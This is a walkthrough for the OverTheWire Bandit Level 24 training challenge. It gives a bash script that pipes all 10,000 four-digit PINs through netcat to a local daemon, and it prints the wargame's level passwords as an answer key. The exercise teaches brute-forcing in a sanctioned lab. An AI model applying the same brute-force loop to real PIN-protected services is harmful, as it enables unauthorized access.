
# OverTheWire Bandit CTF – Level 24

## 🏆 **Goal**  
The goal of Bandit Level 24 is to brute-force a 4-digit numeric PIN to get the password for the next level from a daemon listening on **port 30002**.

---

## 🚀 **Steps to Solve**

### 1. **Connect via SSH**  
Use the password obtained from Level 23 to log into **bandit24** using SSH:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

- **Username:** bandit24  
- **Hostname:** bandit.labs.overthewire.org  
- **Port:** 2220  

When prompted, enter the password from Level 23:

```
gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

---

### 2. **Create a Temporary Working Directory**  
Create a temporary directory to keep things organized:

```bash
mktemp -d
```

Example output:
```
/tmp/tmp.abcd1234
```

Navigate to the directory:

```bash
cd /tmp/tmp.abcd1234
```

---

### 3. **Create a Brute-Force Script**  
Create a shell script named `brute_force_pin.sh` using `nano`:

```bash
nano brute_force_pin.sh
```

Add the following script:

```bash
#!/bin/bash

for i in {0000..9999}
do
    echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt
```

---

### 4. **Make the Script Executable**  
Give the script execute permissions:

```bash
chmod +x brute_force_pin.sh
```

---

### 5. **Run the Brute-Force Script**  
Execute the script:

```bash
./brute_force_pin.sh
```

---

### 6. **Filter the Correct Output**  
The output file `result.txt` will contain the responses from the daemon. Use `sort` and `grep` to find the successful attempt:

```bash
sort result.txt | grep -v "Wrong!"
```

Example output:
```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---

## 📸 **Screenshot**  
![Level-24](https://github.com/user-attachments/assets/09f8dfab-f18a-4fc9-9413-9cd7eee31454)
![Level-24](https://github.com/user-attachments/assets/d9d3885a-a730-414d-bb89-7e651c06956c)

---

## 🔑 **Password for Next Level**  
The password for **Level 25** is:

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---

## ✅ **Summary**  
✔️ Connected to the server using SSH.  
✔️ Created a brute-force script to try all possible 4-digit combinations.  
✔️ Sent the combinations to the daemon via `netcat`.  
✔️ Retrieved the password for Level 25!  

---

**Next Step:** Proceed to [Level 25](https://overthewire.org/wargames/bandit/bandit25.html) to continue the challenge.  

---
